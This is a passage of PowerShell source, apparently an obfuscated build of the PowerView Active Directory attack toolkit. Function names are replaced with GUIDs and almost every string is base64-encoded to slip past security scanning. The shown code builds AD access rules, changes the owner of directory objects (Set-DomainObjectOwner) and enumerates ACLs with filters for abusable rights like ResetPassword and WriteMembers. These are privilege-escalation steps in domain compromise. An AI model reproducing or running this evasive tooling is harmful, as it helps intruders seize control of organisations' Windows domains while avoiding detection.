                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcwAgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0ACAAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
            }
            ${23ca6558fa4b4ce695fc6d89d0b892e5} = ${404fe06381724338825bde6aaf9ef9e4}.objectsid
        }
        else {
            ${23ca6558fa4b4ce695fc6d89d0b892e5} = $PrincipalIdentity
        }
        ${8d466f77f5754c7dbe9195f6f634b654} = 0
        foreach(${bdb558cb1377429b9889f4ac488e8b60} in $Right) {
            ${8d466f77f5754c7dbe9195f6f634b654} = ${8d466f77f5754c7dbe9195f6f634b654} -bor (([System.DirectoryServices.ActiveDirectoryRights]${bdb558cb1377429b9889f4ac488e8b60}).value__)
        }
        ${8d466f77f5754c7dbe9195f6f634b654} = [System.DirectoryServices.ActiveDirectoryRights]${8d466f77f5754c7dbe9195f6f634b654}
        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${23ca6558fa4b4ce695fc6d89d0b892e5})
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
        else {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${8d466f77f5754c7dbe9195f6f634b654}, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
    }
}
function Set-DomainObjectOwner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${e5ca412008094d93b134a55e369a2fb2} = dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if (${e5ca412008094d93b134a55e369a2fb2}) {
            ${7311499ffdbb4fb387f2ad2ba3f8efa3} = [System.Security.Principal.SecurityIdentifier]${e5ca412008094d93b134a55e369a2fb2}
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAG8AdwBuAGUAcgAgAGkAZABlAG4AdABpAHQAeQAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
        }
    }
    PROCESS {
        if (${7311499ffdbb4fb387f2ad2ba3f8efa3}) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            ${9171096ca29742bdb84aad9e9406f3c6} = dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d
            ForEach ($Object in ${9171096ca29742bdb84aad9e9406f3c6}) {
                try {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHMAZQB0ACAAdABoAGUAIABvAHcAbgBlAHIAIABmAG8AcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwAgAHQAbwAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
                    ${d52add069fcb40558b75c2b54ec44ab4} = ${9171096ca29742bdb84aad9e9406f3c6}.GetDirectoryEntry()
                    ${d52add069fcb40558b75c2b54ec44ab4}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))
                    ${d52add069fcb40558b75c2b54ec44ab4}.PsBase.ObjectSecurity.SetOwner(${7311499ffdbb4fb387f2ad2ba3f8efa3})
                    ${d52add069fcb40558b75c2b54ec44ab4}.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcwBlAHQAdABpAG4AZwAgAG8AdwBuAGUAcgA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function ec0cbdfd08d5425a85d28477162ec2fb {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${a329f61743c94fcaa7eb249f2988de80},
        [Switch]
        $ResolveGUIDs,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))
        }
        else {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${486dcc688c2b48a488cb68117b070ee0} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
        ${521e61b494bd46afabd14d4b6d46ac9f} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${521e61b494bd46afabd14d4b6d46ac9f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${521e61b494bd46afabd14d4b6d46ac9f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${521e61b494bd46afabd14d4b6d46ac9f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${521e61b494bd46afabd14d4b6d46ac9f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${521e61b494bd46afabd14d4b6d46ac9f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            ${4ec6a424a697407eb189b374cdcb24a9} = deb7531da8424a2990dabc7592791ba6 @521e61b494bd46afabd14d4b6d46ac9f
        }
    }
    PROCESS {
        if (${486dcc688c2b48a488cb68117b070ee0}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwAgAGYAcgBvAG0AIAAnACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQAnAA==')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${486dcc688c2b48a488cb68117b070ee0} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${486dcc688c2b48a488cb68117b070ee0}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnAA==')))
                        }
                    }
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('.')) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQApAA==')))
                }
                else {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQApAA==')))
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            if ($Filter) {
                ${486dcc688c2b48a488cb68117b070ee0}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $(${486dcc688c2b48a488cb68117b070ee0}.filter)"
            ${c1d2f3b775df48dfbe092797965c6f30} = ${486dcc688c2b48a488cb68117b070ee0}.FindAll()
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    ${23ca6558fa4b4ce695fc6d89d0b892e5} = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    ${23ca6558fa4b4ce695fc6d89d0b892e5} = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 0 | ForEach-Object { if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
